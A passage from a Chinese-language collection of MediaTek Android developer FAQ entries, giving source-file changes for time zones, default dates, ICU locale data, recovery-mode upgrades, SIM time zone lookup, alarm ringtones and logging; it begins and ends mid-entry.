问题描述：在设置日期时会用到DatePicker这个控件，控件中分为年月日3个部分显示，在某些语言下（比如俄语），月份名称比较长，会超出控件范围。

修改方法：以俄语为例，将月份改短。

ICS版本：
修改 frameworks\base\core\res\res\values-ru-rRU\donottranslate-cldr.xml文件

下面的这几行：
<string name="month_medium_january">1 月</string>
<string name="month_medium_february">2 月</string>
<string name="month_medium_march">3 月</string>
<string name="month_medium_april">4 月</string>
 
其他（GB，JB，KK）版本：
修改external\icu4c\data\locales\ru.txt的monthNames。
（L，M）版本：
修改external\icu\icu4c\data\locales\ru.txt的monthNames。
修改后需要重新编译ICU资源，可以参考另一个FAQ： FAQ04011
```

## [icu]  [默认值]  [FAQ06455]  【Zone】如何在设置中添加时区

```text
解决方案：以加入Nigeria时区为例，应该如下修改：
1.找到该国家在zoneinfo中的时区信息。
时区信息的文件可以从 ftp://munnari.oz.au/pub/ 下载到最新的，解压 tzdata201x*.tar.gz 后，在每个地区的txt文件中有城市的时区信息，搜索是否有您要添加的城市，则该时区可以添加；如果没有搜索到相关的国家或城市，则需要考虑使用别的城市的时区。
比如在 africa.txt 中搜索 Nigeria，可以找到下面的内容：
# Nigeria
# Zone NAME  GMTOFF RULES FORMAT [UNTIL] 
Zone Africa/Lagos 0:13:36 - LMT 1919 Sep
1:00 - WAT
这样可以看到，尼日利亚只有一个城市可以作为时区ID，这个ID就是Africa/Lagos。

2.修改 packages/apps/Settings/res/xml-xx-rYY/timezones.xml 或 packages/apps/Settings/res_ext/xml-xx-rYY/timezones.xml （xx-rYY表示不同的语言和区域）,添加下面的内容（notice:如果只在xml-en-rUS下加那只在设置为en_US时才会有该时区，需要在每种语言下都添加）：
<!-- timezones.xml 用于在setting中增加一个时区设置项 -->
<timezone id="Africa/Lagos">Lagos</timezone>
( Android M )
时区ID的定义是放在 frameworks/base/packages/SettingsLib/res/xml/timezones.xml 文件中的，在这里面添加时区需要从新编译frameworks.

3.修改 framework/base/core/res/res/xml/time_zones_by_country.xml ，添加下面的内容
<!--time_zones_by_country.xml 这个用于自动匹配时区时使用，通过country code找一个时区 -->
<!-- Nigeria, 1:00 -->
<timezone code="ng">Africa/Lagos</timezone>
<!-- 这里的code="ri"表示国家代码，比如中国对应cn，美国对应us，不清楚可以维基百科查询ISO_3166-1-->

4.重新编译Setting
```

## [默认值]  [clock]  [FAQ04318]  如何修改出厂默认日期和默认时区

```text
一、修改默认时间
1、修改RTC默认日期：
Android L之前：
\alps\mediatek\custom\[project] \preloader\ inc\cust_rtc.h
\alps\mediatek\custom\[project] \kernel\rtc\rtc\rtc-mt65XX.h
Android L或M：
bootable\bootloader\preloader\custom\[project] \inc\cust_rtc.h
#define RTC_DEFAULT_YEA         2012
#define RTC_DEFAULT_MTH        2
#define RTC_DEFAULT_DOM        1

2、修改默认日期：
framework\services\java\com\android\server\NetworkTimeUpdateService.java
systemReady()
if(isFirstBoot){
Time today = new Time(Time.getCurrentTimezone());
today.setToNow();   // 将时间恢复到RTC时间
today.set(1, 0, mDefaultYear ); //设立出厂默认日期，mDefaultYear是默认年份
如果想恢复出厂设置后，系统时间不变，可使用today.setToNow();
如果想恢复出厂设置后，系统时间也恢复成出厂时间，可使用today.set(1, 0, mDefaultYear );
这个today.set方法有6个参数的重载，可以精确到秒，具体使用方法请自行查询API，所以在这里设置系统默认时间就可以了。

如果要設置出廠默認年份需要修改
1)   mediatek\frameworks\base\res\res\values\config.xml将default_restore_year 修改成 2013
（Android L：vendor\mediatek\proprietary\frameworks\base\res\res\values）
<!-- default year for first power on-->
<integer name="default_restore_year">2013</integer>

2)   frameworks\base\services\java\com\android\server\NetworkTimeUpdateService.java
if(today.year <= 2010){ //删除此行判断条件
    today.set(today.monthDay, today.month, 2013);
    Log.d(TAG, "Set the year to 2013");
    SystemProperties.set(BOOT_SYS_PROPERTY, "false");
    SystemClock.setCurrentTimeMillis(today.toMillis(false));
}

修改后的表现可通过Setting菜单->时间日期设置):

3、修改默认时区：
在系统属性中增加下面字段(假设改为Moscow)
Android L之前：
mediatek\config\[project] \system.prop
Android L:
device\mediatek\[project] \system.prop
persist.sys.timezone = Europe/Moscow注意：默认时区的修改会影响默认时间的值，会根据与格林尼治标准时间差来更新时间，这是正常现象。如当前设置为中国标准时间GMT+8:00，则手机的出厂时间会变为8:00。
```

## [FAQ11211]  使用一些字库后，字符整体偏上

```text
有些字库字形设计不是很标准，字形高度偏小，这样导致使用字库后，字符相对icon整体上移，如下藏语显示问题：

解决这个问题可以使用其他字库来解决，对于JB3、JB5、JB9也可以通过修改代码解决，如下
修改文件：TextPaint.java(alps\frameworks\base\core\java\android\text)

1、新增如下函数
/**
 * @hide
 */
public int getFontMetricsInt(String text, int start, int end, FontMetricsInt fm) {
    Rect bounds = new Rect();
    if (start < 0) {
        start = 0;
    }
    if (end < 0) {
        end = 0;
    }
    if (text == null) {
        start = end = 0;
    } else if (text.length() < end) {
        end = text.length();
    }
    super.getTextBounds(text, start, end, bounds);
    super.getFontMetricsInt(fm);
    if (bounds.top < fm.top) {
        fm.top = bounds.top;
        fm.ascent = bounds.top;
    }
    if (bounds.bottom > fm.bottom) {
        fm.bottom = bounds.bottom;
        fm.descent = bounds.bottom;
    }
    return fm.descent - fm.ascent + fm.leading;
}

2、修改如下函数
/**
 * @hide
 */
public int getFontMetricsInt(char[]  text, FontMetricsInt fm, int pos, int len) {
    if (text == null || text.length == 0) {
        return super.getFontMetricsInt(fm);
    }
    return getFontMetricsInt(String.valueOf(text) , 0, text.length, fm);
}
```

## [icu]  [FAQ10881]  数字、日期、时间客制化问题

```text
世界各地的风俗和语言习惯不同，其数字、货币、时间、日期、国家名称显示形式也是不尽相同。
Android引入了ICU4C(External)解决了这些国际化的问题，下面列出了常见的客制化的问题。

1、数字、货币
各个国家数字以及数值表示方式不同，如英文2.46，阿拉伯语为٢‎,٤‎٦‎，而俄文却是2，46。如果系统语言为俄文，想要把数字显示成英语格式，按照如下：
NumberFormat inf = NumberFormat. getInstance(new Locale(“en”));
String str = nf.format(2.46);
有关货币、int、percent等类型格式化具体可参考NumberFormat.java

2、时间、日期
关于时间格式化和数字差不多，具体例子如下：
SimpleDateFormat sdf = new SimpleDateFormat(“hh:mm”，new Locale(“en”));
String result = sdf.format(mCalendar.getTime());
SimpleDateFormat sdf = new SimpleDateFormat(“EEEE, MMMM d”，new Locale(“en”));
String result = sdf.format(mCalendar.getTime());

3、其他ICU资源
一些ICU字串，如日期、语言、时区、国家等的翻译在External/icu4c/data/下各个子目录下，常见如：
lang：各种语言对其他语言的翻译,常见地方为Setting的语言列表。
locale：月份、星期、日期、AM/PM等日期相关的翻译。
zone：时区名称定义。
region：地区、国家名称。

如果修改了ICU资源，必须重新编译ICU资源，在Remake工程，否则不会起效果。具体编译方法可以参考：FAQ04011
```

## [FAQ17708]  时区列表中名称无法修改

```text
参考  FAQ08718【TimeZone】如何修改时区的显示名称。
修改时区名字后时区列表某些时区没又效果,不过设置中的时区显示已经修改OK.

请将timepicker.java中的
private void addTimeZone(String olsonId) {

//            if (mLocalZones.contains(olsonId)) {
//                mZoneNameFormatter.setTimeZone(tz);
//                displayName = mZoneNameFormatter.format(mNow);
//                Log.d(TAG,"lijinhai addTimeZone  mLocalZones1 displayName="+displayName);
//            } else {
//              }

将IF这个分支全部去掉，直接跑else里面的内容就OK了。
```

## [FAQ17514]  [Recovery] Recovery mode FAQ搜寻指南

```text
Android系统Recovery工作原理之使用update.zip升级过程分析（一）---update.zip包的制作
https://blog.csdn.net/mu0206mu/article/details/7399822

Recovery mode 依据不同问题归类为几个属性标签如下

[Debug/Log]    :debug log , adb 相关问题
[OTAError]       :升级过程报错相关问题
[UI/Key]          : UI 界面与 custom key 配置相关问题
[Otapackage]   : 制作升级包相关问题
[SecureOTA]    : secure boot project 升级相关问题
[FactoryReset] : 恢复出厂设置， 预置资源问题
[Common]       : 典型问题
[升级lk、Preloader] :lk、Preloader升级问题
[Others]          : 其他未分类问题

1.大版本升级相关问题
FAQ18202 [Recovery]  [Common] Android L ->M版本OTA/T卡升级注意事项
FAQ13472 [Recovery]  [Common] 从KK(4.4)版本通过OTA升级到L(5.0)版本的问题集锦
FAQ11465 [Recovery]  [OTAError] JB升级到KK在升级界面出现一个警告提示“Warning ,No file_contexts”
FAQ11447 [Recovery]  [Common] 从JB(4.2)版本通过FOTA升级到KK(4.4)版本的注意事项

2.UI 界面与 custom key 配置相关问题
FAQ14484 [Recovery]  [UI/Key] 如何修改L版本recovery mode 小机器人界面进入菜单，由volume up&power改为直接按power(如同KK以前版本)
FAQ13766 [Recovery]  [UI/Key] L 版本进入recovery mode的方式有改变
FAQ09061 [Recovery]  [UI/Key] recovery相关按键的配置与客制化
FAQ08110 [Recovery]  [UI/Key] 如何修改recovery mode下字体的大小
FAQ06386 [Recovery]  [UI/Key] JB2版本关机状态按PowerOn+VolUp键进入RecoveryMode直接显示菜单
FAQ04463 [Recovery]  [UI/Key] android 4.1版本（Jelly Bean ）后的平台Recovery Mode下直接进入menu 
FAQ03439 [Recovery]  [UI/Key] 如何进入recovery mode立即显示menu菜单

3.升级报错
FAQ18367 [Driver - Recovery]  Android M error: Invalid OTA package,missing scatter Installation aborted
FAQ18250 [recovery]  [common] Android M upgrade occurs “Error: Invalid OTA package, missing scatter”
FAQ14973 [Recovery]  [OTAError] Adb sideload OTA升级失败报错："E: unknown volume for path [/sideload/pakage.zip] ”
FAQ14782 [Recovery]  [OTAError] L版本开启MTK_SHARED_SDCARD 后OTA包放入内卡如何MOTA升级成功?
FAQ14769 [Recovery]  [OTAError] L版本OTA升级遇到error："system has been remounted R/W; reflash device to reenable OTA updates"
FAQ11475 [Recovery]  [OTAError] 升级报错"Error: System property does not match"怎么办?
FAQ11106 [Recovery]  [OTAError] SECURE OTA 升级包里面缺少SEC_VER.txt导致升级失败
FAQ11048 [Recovery]  [OTAError] 从外置SD卡升级过程断电，再升级，无法看到"apply sdcard2:update.zip"提示！
FAQ04471 [Recovery]  [OTAError] MOTA/FOTA升级失败，怎么办?
 
 
4.升级包制作与签名相关
FAQ12479 [Recovery]  [Otapackage] 为什么制作差分包时未使用-k 选项有时可以升级成功、有时却失败?
FAQ11470 [Recovery]  [Otapackage] 如何制作差分包且正确签名?
FAQ11464 [Recovery]  [Otapackage] JB升级到KK如何正确编译差分升级包update.zip?
FAQ03534 [Recovery]  [Otapackage] 如何给OTA升级包重新签章
FAQ03441 [Recovery]  [Otapackage] 如何制作和使用OTA（sdcard）升级包
FAQ03440 [Recovery]  [Otapackage] 如何制作user版本的T卡升级包
FAQ02507 [Recovery]  [Otapackage] 如何编译完整升级包
 
5.编译与编译报错问题
FAQ14456 [Recovery]  [Otapackage] system.img>2G导致编译otapackage时报错如何处理
FAQ14455 [Recovery]  [Otapackage] 打开MTK_CIP_SUPPORT=yes后make otapackage报错KeyError:"/custom"
FAQ10545 [Recovery]  [Otapackage] The "brom_lite" is not found in the SD card upgrade package for JB9?
FAQ10544 [Recovery]  [Otapackage] MT6572+ UBIF文件系统build出来的OTA包不含system.img该怎么办?
FAQ07599 [Recovery]  [Otapackage] ./mk otapackage报错总结
FAQ03436 [Recovery]  [Debug/Log] 如何单独 build recovery image
 
6.MTK_SHARED_SDCARD 宏相关问题
FAQ12478 [Recovery]  [Common] 关于打开MTK_SDCARD_SWAP 宏后MTK目前升级方案
FAQ12477 [Recovery]  [Common] 关于打开MTK_SHARED_SDCARD宏后MTK目前升级方案
 
7.恢复出厂设置，预置资源问题
FAQ17418 [Recovery]  [Build]  预置资源（如apk）到userdata，otapackage之后的userdata.img没有此资源 
FAQ13434 [Recovery]  [FactoryReset] L 开启MTK_SHARED_SDCARD，恢复出厂设置还能实现keep_list功能吗?
FAQ12384 [Recovery]  [FactoryReset] 不打开Shared sdcard功能，内置SD卡中预置资源，删除资源，恢复出厂设置恢复
FAQ11954 [Recovery]  [Others] 如何实现恢复出厂后不重新启动手机?FAQ10734 [Recovery]  [FactoryReset] 开启了MTK_SHARED_SDCARD之后；恢复出厂设置如何保留预置资源?
FAQ06388 [Recovery]  [FactoryReset] 89 JB2平台上factory reset从LK进入Recovery Mode画面切换有黄条
FAQ05341 [Recovery]  [FactoryReset] 如何避免data分区的.keep_list和.restore_list被意外损坏导致special factory reset不成功
FAQ03437 [Recovery]  [FactoryReset] special factory reset preserve or restore apk to /data/app
FAQ03434 [Recovery]  [Others] 恢复出厂设置之后如何将时间变为初始值
 
8.Secure boot project 的升级问题
FAQ14751 [Recovery]  [SecureOTA] L 版本Security OTA升级方法
FAQ11106 [Recovery]  [OTAError] SECURE OTA 升级包里面缺少SEC_VER.txt导致升级失败
FAQ05739 [Recovery]  [SecureOTA] OTA升级secutiry device的注意点
FAQ17784 [Recovery]  [Common] Android M OTA build (Include Security OTA)
 
9.Debug log ,adb 功能相关
FAQ15046 [Recovery]  [Debug/Log] L版本Recovery Mode打开adb功能
FAQ12130 [Recovery]  [Common] 如何通过adb command 完成自动SD卡升级?
FAQ10547 [Recovery] adb shell df 命令显示的系统分区Size不准确 ?
FAQ09814 [Recovery]  [Debug/Log] 如何在recovery mode下抓取coredump
FAQ08726 [Recovery]  [Debug/Log] How to enable adb in Recovery Mode
FAQ04559 [recovery]  [Common] 从JB版本开始支持adb sideload命令
FAQ03442 [Recovery]  [Debug/Log] 如何在recovery mode下抓取LOG
 
10.升级包保存或删除问题
FAQ12492 [Recovery]  [Others] SD卡升级包升级后，如何删除升级包文件?
FAQ10759 [Recovery]  [Others] MOTA升级成功后想保留OTA升级包该怎么办?
 
11.内外卡,data路径相关问题
FAQ18251 [Recovery]  [common]  Android M Adoptable SD卡无法在recovery mode识别和使用
FAQ17442 [Recovery]  [Common] Android L和M 版本data加密后升级包放入/data分区如何升级?
FAQ12491 [Recovery]  [Common] Recovery mode 选择"apply update from sdcard"直接进入data/目录是否正常?
FAQ08109 [Recovery]  [Common] 在recovery mode下同时挂载内置T卡和外置T卡
FAQ05443 [Recovery]  [Others] 从data区读取状态来确定升级用内外置卡导致升级不成功
FAQ04366 [Recovery]  [Common] JB版本的recovery mode下使用外置T卡升级修改方法
FAQ03432 [Recovery]  [Common] Recovery mode下mount外置T卡的方法(emmc)

12.重启相关问题
FAQ12481 [Recovery]  [Others] Recovery mode在cache/recovery目录下新建一支文件，重启后，新建文件消失了
FAQ11015 [Recovery]  [Others] 通过组合键进入recovery模式选择sdcard菜单升级，升级完如何自动重启?
FAQ03431 [Recovery]  [Others] OTA升级在recovery mode下无法返回normal mode

13.lk、Preloader等分区升级相关问题
FAQ18188 [Recovery]  [Common] Android M 版本如何升级logo等rawdata分区方法?
FAQ17441 [Recovery]  [Common] Android M 版本如何升级lk 、preloader ? 
FAQ12947 [Recovery] Update LOGO&LK&PRELOADER via OTA upgrade

14.其他升级问题
FAQ18467 add selinux policy in OTA
FAQ14482 [Recovery]  [Others] 如何在recovery mode下单独关闭selinux 而不影响normal mode
FAQ04813 [Recovery] 使手机设置菜单里的序列号为手机的barcode值
FAQ03435 [Recovery]  [Common] 如何查看手机上的build时间戳
```

## [FAQ12127]  插入俄罗斯SIM卡获取时区不对

```text
手机插入俄罗斯SIM卡，发现根据MCC获取的时区不是Moscow，
如KK版本插入俄罗斯卡，发现当前时区是Europe/Kaliningrad，L版本则是Europe/Andorra
[SOLUTION] 
这是因为系统在通过MCC获取时区时是先获取sim卡所属国家所有的时区列表，然后把列表的第一个作为返回值。
因为Moscow不是第一位，因此出现上面这种情况，
一般从log中会有这样的下面的关键字打出，
KK版本：
06-03 10:05:27.069   864   864 D GSM     : [GsmSST0]  pollStateDone: try to fixTimeZone mcc:250 mccTz:Europe/Kaliningrad
06-03 10:05:27.069   864   864 D GSM     : [GsmSST0]  pollStateDone: using default TimeZone
06-03 10:05:27.069   864   864 D GSM     : [GsmSST0]  pollStateDone: zone != null zone.getID=Europe/Kaliningrad
Android L：
04-14 05:21:51.436  3596  3596 D GSM     : [GsmSST1]  pollStateDone: try to fixTimeZone mcc:250 mccTz:Europe/Andorra zone.getID=Europe/Andorra
04-14 05:21:51.436  3596  3596 D GSM     : [GsmSST1]  pollStateDone: using default TimeZone
04-14 05:21:51.436  3596  3596 D GSM     : [GsmSST1]  pollStateDone: zone != null zone.getID=Europe/Andorra
这个问题可以修改defaultTimeZoneForMcc返回值解决如下：
MccTable.java alps\frameworks\opt\telephony\src\java\com\android\internal\telephony 
public static String defaultTimeZoneForMcc(int mcc) {
    MccEntry entry;
    entry = entryForMcc(mcc);
    if (entry == null || entry.mIso == null) {
        return null;
    } else {
        Locale locale;
        if (entry.mLanguage == null) {
            locale = new Locale("", entry.mIso);
            Slog.d(LOG_TAG, "defaultTimeZoneForMcc: mcc=" + mcc + ", mIso=" + entry.mIso);
        } else {
            locale = new Locale(entry.mLanguage, entry.mIso);
            Slog.d(LOG_TAG, "updateMccMncConfiguration: mcc=" + mcc +
                                    ", mLanguage=" + entry.mLanguage +
                                    ", mIso=" + entry.mIso);
        }
        String[]  tz = TimeZoneNames.forLocale(locale);
        if (tz.length == 0) return null;  
         if(mcc==250) return "Europe/Moscow"；////add this line
        return tz[0] ;
    }
}
 
Android M: 
/frameworks/opt/telephony/src/java/com/android/internal/telephony/MccTable.java
public static String defaultTimeZoneForMcc(int mcc) {
    MccEntry entry = entryForMcc(mcc);
    if (entry == null) {
        return null;
    }
    Locale locale = new Locale("", entry.mIso);
    String[]  tz = TimeZoneNames.forLocale(locale);
    if (tz.length == 0) return null;
    if(mcc==250) return "Europe/Moscow"；////add this line
    return tz[0] ;
}
```

## [FAQ17902]  如何关闭灭屏时colorFade渐变动画

```text
在displayPowerController.java文件updatePowerState函数，将performScreenOffTransition的赋值修改为false
```

## [FAQ19228]  [Audio APP]  android 7.0 充电提示音无效

```text
其实是需要无线充电的时候才会发出声音
 
代码逻辑如下：
这个设定是更改 setting 里面的 Settings.Global.CHARGING_SOUNDS_ENABLED
最后会被 frameworks/base/services/core/java/com/android/server/power/Notifier.java 去检测
private void playWirelessChargingStartedSound() {
    final boolean enabled = Settings.Global.getInt(mContext.getContentResolver(),
    Settings.Global.CHARGING_SOUNDS_ENABLED, 1) != 0; //更改的是 Settings.Global.CHARGING_SOUNDS_ENABLED
    final String soundPath = Settings.Global.getString(mContext.getContentResolver(),
    Settings.Global.WIRELESS_CHARGING_STARTED_SOUND);
    if (enabled && soundPath != null) {
        final Uri soundUri = Uri.parse("file://" + soundPath);
        if (soundUri != null) {
            final Ringtone sfx = RingtoneManager.getRingtone(mContext, soundUri);
            if (sfx != null) {
                sfx.setStreamType(AudioManager.STREAM_SYSTEM);
                sfx.play();
            }
        }
    }
    mSuspendBlocker.release();
}


而这个检测方法是在 PowerManagerService 中被调用的
看逻辑是只在无线充电的时候才会有声音

PowerManagerService.java中updateIsPoweredLocked函数中，
if (dockedOnWirelessCharger) {
    mNotifier.onWirelessChargingStarted();
}
```

## [FAQ19277]  [FM]  android 7.0 FMRadio 的正确更新方式

```text
有客户遇到原生的 FMRadio app 用 install 的方式安装后打开会出现 force close, 查看 log 是加载 library 出错
01-01 04:35:22.406100 12311 12311 E AndroidRuntime: FATAL EXCEPTION: main
01-01 04:35:22.406100 12311 12311 E AndroidRuntime: Process: com.android.fmradio, PID: 12311
01-01 04:35:22.406100 12311 12311 E AndroidRuntime: java.lang.UnsatisfiedLinkError: dlopen failed: library "/system/lib64/libfmjni.so" needed or dlopened by "/system/lib64/libnativeloader.so" is not accessible for the namespace "classloader-namespace"
01-01 04:35:22.406100 12311 12311 E AndroidRuntime: at java.lang.Runtime.loadLibrary0(Runtime.java:977)
01-01 04:35:22.406100 12311 12311 E AndroidRuntime: at java.lang.System.loadLibrary(System.java:1530) 

这是因为安装方式不正确，android 7.0 开始，FMRadio 默认是安装在 system/priv-app/FMRadio/下面，所以如果有开发过程中有验证需求，需要把 FMRadio.apk push 到 system/priv-app/FMRadio/ 下面，然后重启验证。

如果是用 adb install 的方式，会安装到 data/app/ 下面, 不具有加载 system library 的权限
```

## [FAQ19280]  开机后，首次图案解锁失败

```text
请如下修改：
/system/gatekeeper/gatekeeper.cpp
uint32_t GateKeeper::ComputeRetryTimeout(const failure_record_t *record) {
    if (record->failure_counter > 0 && record->failure_counter <= 10) {
        if (record->failure_counter % 5 == 0) {
            return 30000;
        }
    } else {
        return 30000;
    }
    return 0;
}
修改成如下：
uint32_t GateKeeper::ComputeRetryTimeout(const failure_record_t *record) {
    if (record->failure_counter > 0 && record->failure_counter <= 10) {
        if (record->failure_counter % 5 == 0) {
            return 30000;
        }
    } else if(record->failure_counter == 0){ //增加了fail次数为0的判断
        return 0;
    } else{
        return 30000;
    }
    return 0;
}
```

## [FAQ19296]  将歌曲设为闹钟铃声，删除该歌曲后，来闹钟后，铃声只响一声，如何修改为正常响很多声?

```text
1，问题原因是当mRingtone == null时，未setloop，所以不会循环播放。
2，修改如下：
AsyncRingtonePlayer.java (packages\apps\deskclock\src\com\android\deskclock)

private static class RingtonePlaybackDelegate implements PlaybackDelegate {

public void play(Context context, Uri ringtoneUri, boolean inCall) {

LogUtils.d(TAG, "lll RingtonePlaybackDelegate Play ringtoneUri="+ringtoneUri,new Exception("callstack"));
if (Looper.getMainLooper() == Looper.myLooper()) {
LogUtils.e(TAG, "Must not be on the main thread!", new IllegalStateException());
}

LogUtils.i(TAG, "Play ringtone via android.media.Ringtone.");

if (mAudioManager == null) {
mAudioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
}

final boolean inTelephoneCall = inCall; //isInTelephoneCall(context);
if (inTelephoneCall) {
ringtoneUri = getInCallRingtoneUri(context);
}

// attempt to fetch the specified ringtone
mRingtone = RingtoneManager.getRingtone(context, ringtoneUri);
// Attempt to enable looping the ringtone.
/// M: if the alarm's uri exists but the real file is missing
if (mRingtone == null
|| !AlarmClockFragment.isRingtoneExisted(context, ringtoneUri.toString())) {
// fall back to the default ringtone
final Uri defaultUri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM);
mRingtone = RingtoneManager.getRingtone(context, defaultUri);
}

//该段代码移动如下
try {
mSetLoopingMethod.invoke(mRingtone, true);
} catch (Exception e) {
LogUtils.e(TAG, "Unable to turn looping on for android.media.Ringtone", e); 
// Fall back to the default ringtone if looping could not be enabled.
// (Default alarm ringtone most likely has looping tags set within the .ogg file)
mRingtone = null;
}
//该段代码移动如上

// if we don't have a ringtone at this point there isn't much recourse
if (mRingtone == null) {
LogUtils.i(TAG, "Unable to locate alarm ringtone.");
return;
}
if (Utils.isLOrLater()) {
mRingtone.setAudioAttributes(new AudioAttributes.Builder()
.setUsage(AudioAttributes.USAGE_ALARM)
.setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
.build());
}
// Attempt to adjust the ringtone volume if the user is in a telephone call.
if (inTelephoneCall) {
LogUtils.v("Using the in-call alarm");
try {
mSetVolumeMethod.invoke(mRingtone, IN_CALL_VOLUME);
} catch (Exception e) {
LogUtils.e(TAG, "Unable to set in-call volume for android.media.Ringtone", e);
}
}
mAudioManager.requestAudioFocus(null, AudioManager.STREAM_ALARM,
AudioManager.AUDIOFOCUS_GAIN_TRANSIENT);
mRingtone.play();
}
```

## [FAQ19290]  如何查看TCP Buffer size大小

```text
查看:
情况1:log中包含数据连接的过程
A.查看radio_log,搜索关键字setup_data_call,确定default PDP建立连接的时间点.
B.查看sys_log,搜索关键字Setting tx/rx TCP buffers,查看测试时间点或建立数据连接时间点设置的值
 
情况2:netlog中含有dump-networking log,搜索关键字tcp_rmem及tcp_wmem,查看readBuffer及writeBuffer.
提示:只有手动停止mtklog,netlog中才会包含dump-networking log.
 
修改:
文件:DataConnection.java
方法:搜索关键字 TCP_BUFFER_SIZES,会看到根据网络环境设置的各种buffer size,可以根据需要进行修改.
如: private static final String TCP_BUFFER_SIZES_LTE="524288,1048576,2097152,262144,524288,1048576";
表示4G环境下,设置的tcp buffer sizes的值,其中前三个值是readBuffer,后三个值是writeBuffer.
```

## [FAQ19263]  查看热点支持连接数

```text
用 grok 在代码中搜索 max_num_sta 即可

alps/kernel-4.9/drivers/staging/wilc1000/host_interface.h 19 #define MAX_NUM_STA 9 macro 

1. find out the file( /data/misc/wifi/hostapd.conf ), in hotspot device;

P:/data/misc/wifi/softap.conf

2. find out the key (max_num_sta), the valuse of the key is the hotspot's capability.

forexample:
if the max_num_sta equal 8, so the hotspot's capability can support 8 stations at the same time.
```

## [log]  [FAQ11035]  如何通过USB接口抓UART log

```text
M版本以及以后的版本不再支持此Feature！
 
目前6572和6582 之后平台可以使用USB线抓取UART log，具体的操作方法如下

[SOLUTION] 
L 版本：
步骤1.请打开如下两个宏：

preloader：
alps/bootable/bootloader/preloader/platform/$platform/default.mk
CFG_USB_UART_SWITCH

kernel:
alps/kernel-3.10/arch/arm/configs/xxx_defconfig
CONFIG_MTK_UART_USB_SWITCH

步骤2. enable from engineer mode
输入*#*#3646633#*#*
Hardware -> UART/USB Switch ->进去可以切换mode

注意：
1.切换前不能插入cable
2.DP ->TX ; DM -> RX
3. 连线需要连UART线，不能连USB线

L以前版本：
6572 6571平台：
在 Mediatek/custom/<proj>/preloader/inc/cust_bldr.h 里将 CFG_USB_UART_SWITCH 宏打开
6582 6592平台：
Mediatek/custom/<proj>/preloader/cust_bldr.mak里将 CFG_USB_UART_SWITCH 宏打开，

具体代码您可以参考alps/mediatek/platform/mt6582/preloader/src/drivers/Platform.c的platform_pre_init（）函数~
```

## [log]  [FAQ18106]  如何将ATF log输出到uart?

```text
ATF启动后，只有开始部分log有吐到uart，后面就仅仅放在ATF log buffer里，由mtklogger收集。
有些情况下需要看ATF log，而无法通过mtklogger查看，就需要通过uart查看了，下面给出在ATF打开uart log的方法。
 
修改位置在：
L版本 : vendor/arm/atf-1.0/bl31/bl31_main.c
M版本 : vendor/mediatek/proprietary/trustzone/atf/v1.0/bl31/bl31_main.c
里的bl31_main()里的clear_uart_flag()注释掉即可：
void bl31_main(void) {
    ......
#ifndef SVP3_ENABLE
    bl31_prepare_next_image_entry();
#else
    bl31_prepare_kernel_entry(1); // prepare 64 bits kernel directly
#endif
    printf("[BL31]  Final dump!\n\r");
    //clear_uart_flag(); //这行注释掉
    printf("[BL31]  SHOULD not dump in UART but in log buffer!\n\r");
}
```

## [clock]  [默认值]  [FAQ06190]  默认打开自动更新时间

```text
Q：进入设置——》日期和时间——》自动确定日期和时间，现自动确定日期和时间默认为关闭，需要改为默认是：使用网络提供时间 。该如何修改?
A：请修改
defaults.xml (alps\frameworks\base\packages\settingsprovider\res\values)
<bool name="def_auto_time">false</bool> //将false改为true (可能默认就是true)

如果是CMCC定制的项目,请修改
defaults.xml(alps\vendor\mediatek\proprietary\operator\OP01\packages\apps\Plugins\res\values)
<bool name="def_auto_time_op01">false</bool> //将false改为true
 
默认打开后,不一定能自动更新时间,因为这个需要网络环境支持NITZ自动更新才能成功.
```

## [FAQ08879]  [SIM] 如何获取卡对应的plmn

```text
获取卡对应的plmn 

plmn 由MCC MNC组成
MCC全称是Mobile Country Code，3位数组成，用户不同国家的一个识别码；
MNC全称是Mobile Network Code，不同运营商的MNC有区别(MNVO除外)，2位或者3位，这个长度是存放在IccCard的EF_AD当中。

MCC/MNC是从IccCard中读取出来的.以sim卡为例，SIMRecords.java读取，属于Phone 进程的模块。
除了Phone进程，其他应用要获取MCC/MNC不能直接到SIMRecords.java中拿。
所以有考虑到这一点，在读取出mcc/mnc时将其保存，PhoneInterfaceManager.java有提供接口给其他进程呼叫。
L & M & N 版本:
TelephonyManager.java           public String getSimOperator(long subId);

L之前的版本:
TelephonyManager.java           public String getSimOperator(int simId);

使用方法:
try{
    ITelephony tel = ITelePhone.Stub.asInterface(ServiceManager.getService(Context.TELEPHONY_SERVICE));
    String MccMnc = null;
    if(tele != null) {
        //L & M & N 版本
        MccMnc = tel.getSimOperator(subId);
        //L 之前的 版本
        MccMnc = tel.getSimOperator(simId);
    }
}catch (RemoteException ex){
}
PS: 如果只取Mcc的话，MccMnc.subString(0,3)即可
```

## [FAQ19143]  Android N common版本上中文英文字串网址识别错误

```text
Android N上，接收短信时，如果收到的内容有中文和网址时，网址匹配不正确。例如：带有网址和中文时，中文和网址全部带有下划线，中文www.baidu.com中文，整个都会有下划线，需要改成只有www.baidu.com有下划线。Google原生的WEB_URL Pattern都是follow RFC spec定义的，建议不要修改，如果必须要改，可参照下面的solution. 此修改不影响CTS测项，但可能对其它Unicode URL的匹配有影响(如果是Android N之前的版本请参考FAQ13616)。

vendor/mediatek/proprietary/frameworks/base/packages/FwkPlugin/src/com/mediatek/op/util/DefaultPatterns.java

package com.mediatek.op.util;

import android.util.Patterns;
import android.util.Log;

import com.mediatek.common.PluginImpl;
import com.mediatek.common.util.IPatterns;
import com.mediatek.common.util.IPatterns.UrlData;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
* Customize the web URL parsing.
*
*/
@PluginImpl(interfaceName = "com.mediatek.common.util.IPatterns")
public class DefaultPatterns implements IPatterns {
    private static final String TAG = "DefaultPatterns";

    // The regular expressions for filtering out bad url starting and ending
    private static final String mValidCharRegex = "a-zA-Z0-9\\-_";
    // First group: Find the invalid url characters before "xxxx:// or xxx.".
    // Second group: "xxxx:// or xxx."
    private static final String mBadFrontRemovingRegex = String.format(
            "(^[^.] *[^%s.://#&=] +)(?:[a-zA-Z] +://|[%s] +.)", mValidCharRegex, mValidCharRegex);
    // First group: Find the top level domain, ex:".xxx".
    // The ending ")" is for google map url, which may end with a coordinate,
    // ex:"(32.012345, 118.54321)"
    // Second group: The rest characters after the TLD to the end of the string,
    // except some special character may appear in url, ex: "./?=&%"
    private static final String mBadEndRemovingRegex = String.format(
